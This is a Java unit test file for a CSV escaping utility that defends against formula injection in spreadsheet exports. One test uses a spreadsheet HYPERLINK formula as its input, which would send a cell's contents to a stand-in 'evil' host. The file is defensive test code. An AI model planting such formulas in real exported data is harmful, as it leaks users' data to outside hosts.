package com.auraboot.framework.meta.security;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;

/**
 * Unit tests for {@link CsvSafetyUtils#escapeCsvCell(Object)} — CSV / formula
 * injection neutralization used by every CSV export path.
 */
@DisplayName("CsvSafetyUtils.escapeCsvCell")
class CsvSafetyUtilsTest {

    @Test
    @DisplayName("formula-trigger cells are prefixed with a single quote and quoted")
    void formulaTriggersNeutralized() {
        // = + - @ \t \r must never be the first char the spreadsheet sees.
        assertEquals("\"'=1+1\"", CsvSafetyUtils.escapeCsvCell("=1+1"));
        assertEquals("\"'+1\"", CsvSafetyUtils.escapeCsvCell("+1"));
        assertEquals("\"'-1\"", CsvSafetyUtils.escapeCsvCell("-1"));
        assertEquals("\"'@x\"", CsvSafetyUtils.escapeCsvCell("@x"));
        assertEquals("\"'\t=cmd\"", CsvSafetyUtils.escapeCsvCell("\t=cmd"));
    }

    @Test
    @DisplayName("classic exfiltration payload is neutralized (no leading =)")
    void hyperlinkPayloadNeutralized() {
        String out = CsvSafetyUtils.escapeCsvCell("=HYPERLINK(\"//evil/\"&A1,\"x\")");
        // The unescaped cell content (inside the outer quotes) must start with '
        // so a spreadsheet treats it as text, not a formula.
        assertFalse(out.startsWith("=") || out.startsWith("\"="),
                "formula must not be exposed to the spreadsheet, got: " + out);
    }

    @Test
    @DisplayName("ordinary values are unchanged; delimiters/quotes get RFC-4180 quoting")
    void ordinaryAndDelimited() {
        assertEquals("hello", CsvSafetyUtils.escapeCsvCell("hello"));
        assertEquals("123", CsvSafetyUtils.escapeCsvCell(123));
        assertEquals("\"a,b\"", CsvSafetyUtils.escapeCsvCell("a,b"));
        assertEquals("\"a\"\"b\"", CsvSafetyUtils.escapeCsvCell("a\"b"));
        assertEquals("", CsvSafetyUtils.escapeCsvCell(null));
    }
}
